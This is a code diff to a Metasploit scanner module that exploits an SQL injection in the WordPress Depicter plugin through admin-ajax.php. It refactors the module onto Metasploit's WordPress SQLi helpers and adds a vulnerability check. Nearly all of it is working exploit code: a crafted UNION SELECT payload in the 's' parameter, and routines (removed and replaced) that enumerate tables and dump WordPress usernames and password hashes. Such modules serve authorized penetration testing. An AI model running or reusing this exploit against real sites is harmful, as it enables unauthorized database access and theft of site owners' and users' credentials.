@@ -5,7 +5,11 @@
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
-  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Remote::HTTP::Wordpress
+  include Msf::Exploit::Remote::HTTP::Wordpress::SQLi
+  prepend Msf::Exploit::Remote::AutoCheck
+
+  GET_SQLI_OBJECT_FAILED_ERROR_MSG = 'Unable to successfully retrieve an SQLi object'.freeze
 
   def initialize(info = {})
     super(
@@ -44,118 +48,56 @@ class MetasploitModule < Msf::Auxiliary
         }
       )
     )
+
+    register_options([
+      OptString.new('TARGETURI', [true, 'Base path to the WordPress installation', '/']),
+      Opt::RPORT(80)
+    ])
   end
 
-  def run_host(_ip)
-    vprint_status('Retrieving database name via SQLi...')
-    db_name = extract_value_from_sqli('database()')
-    fail_with(Failure::UnexpectedReply, 'Failed to extract database name.') unless db_name
-    vprint_good("Database name: #{db_name}")
+  def get_sqli_object
+    create_sqli(dbms: MySQLi::Common, opts: { hex_encode_strings: true }) do |payload|
+      expr = payload.to_s.strip.gsub(/\s+/, ' ')
+      r1, r2, r3, r4, r5 = Array.new(5) { rand(1000..9999) }
+      injected = "#{r1}') UNION SELECT #{r2},#{r3},(#{expr}),#{r4},#{r5}-- -"
 
-    print_status('Enumerating tables for prefix inference...')
-    raw = 'group_concat(table_name) from information_schema.tables where table_schema=database()'
-    tables_csv = extract_value_from_sqli(raw)
-    fail_with(Failure::UnexpectedReply, 'Failed to enumerate tables.') unless tables_csv
-    vprint_good("Tables: #{tables_csv}")
-
-    visible_tables = tables_csv.split(',')
-    prefix = visible_tables.first.split('_').first
-    users_table = "#{prefix}_users"
-    vprint_status("Inferred users table: #{users_table}")
-
-    print_status('Extracting user credentials...')
-    limit = datastore['COUNT'].to_i
-    raw_creds = "group_concat(user_login,0x3a,user_pass SEPARATOR 0x0a) from (select * from #{db_name}.#{users_table} LIMIT #{limit}) as sub"
-    creds = extract_value_from_sqli(raw_creds)
-    fail_with(Failure::UnexpectedReply, 'Failed to extract credentials.') unless creds
-
-    data = creds.split("\n").map { |u| u.split(':', 2) }
-    table = Rex::Text::Table.new(
-      'Header' => users_table,
-      'Indent' => 4,
-      'Columns' => ['Username', 'Password Hash']
-    )
-    loot_data = ''
-    data.each do |user|
-      table << user
-      loot_data << "Username: #{user[0]}, Password Hash: #{user[1]}\n"
-
-      create_credential(
-        workspace_id: myworkspace_id,
-        origin_type: :service,
-        module_fullname: fullname,
-        username: user[0],
-        private_type: :nonreplayable_hash,
-        jtr_format: Metasploit::Framework::Hashes.identify_hash(user[1]),
-        private_data: user[1],
-        service_name: 'WordPress',
-        address: datastore['RHOST'],
-        port: datastore['RPORT'],
-        protocol: 'tcp',
-        status: Metasploit::Model::Login::Status::UNTRIED
-      )
-      vprint_good("Created credential for #{user[0]}")
-    end
-
-    print_line(table.to_s)
-
-    service = report_service(
-      host: datastore['RHOST'],
-      port: datastore['RPORT'],
-      proto: 'tcp',
-      name: fullname,
-      info: description.strip
-    )
-
-    loot_path = store_loot(
-      'wordpress.users',
-      'text/plain',
-      datastore['RHOST'],
-      loot_data,
-      'wp_users.txt',
-      'WP Usernames and Password Hashes',
-      service
-    )
-    print_good("Loot saved to: #{loot_path}")
-
-    report_host(host: datastore['RHOST'])
-    report_vuln(
-      host: datastore['RHOST'],
-      port: datastore['RPORT'],
-      proto: 'tcp',
-      name: fullname,
-      refs: references,
-      info: description.strip
-    )
-    vprint_good('Reporting completed')
-
-    data
-  end
-
-  def extract_value_from_sqli(expr)
-    expr = expr.to_s.strip.gsub(/\s+/, ' ')
-    r1, r2, r3, r4, r5 = Array.new(5) { rand(1000..9999) }
-    injected = "#{r1}') UNION SELECT #{r2},#{r3},(SELECT #{expr}),#{r4},#{r5}-- -"
-
-    res = send_request_cgi(
-      'method' => 'GET',
-      'uri' => normalize_uri('wp-admin', 'admin-ajax.php'),
-      'vars_get' => {
+      endpoint = normalize_uri('wp-admin', 'admin-ajax.php')
+      params = {
+        'action' => 'depicter-lead-index',
         's' => injected,
         'perpage' => rand(10..50).to_s,
         'page' => rand(1..3).to_s,
         'orderBy' => 'source_id',
-        'dateEnd' => '',
-        'dateStart' => '',
         'order' => ['ASC', 'DESC'].sample,
-        'sources' => '',
-        'action' => 'depicter-lead-index'
+        'dateStart' => '',
+        'dateEnd' => '',
+        'sources' => ''
       }
-    )
-    return unless res&.code == 200
+      res = send_request_cgi(
+        'method' => 'GET',
+        'uri' => endpoint,
+        'vars_get' => params
+      )
+      return GET_SQLI_OBJECT_FAILED_ERROR_MSG unless res&.code == 200
 
-    json = res.get_json_document
-    json.dig('hits', 0, 'content', 'id') ||
-      json.dig('hits', 0, 'content', 'name')
+      extracted = res.get_json_document.dig('hits', 0, 'content', 'id')
+      return GET_SQLI_OBJECT_FAILED_ERROR_MSG if extracted.to_s.empty?
+
+      extracted
+    end
+  end
+
+  def check
+    @sqli = get_sqli_object
+    return Exploit::CheckCode::Unknown(GET_SQLI_OBJECT_FAILED_ERROR_MSG) if @sqli == GET_SQLI_OBJECT_FAILED_ERROR_MSG
+    return Exploit::CheckCode::Vulnerable if @sqli.test_vulnerable
+
+    Exploit::CheckCode::Safe
+  end
+
+  def run_host(_ip)
+    @sqli ||= get_sqli_object
+    wordpress_sqli_initialize(@sqli)
+    wordpress_sqli_get_users_credentials(datastore['COUNT'])
   end
 end
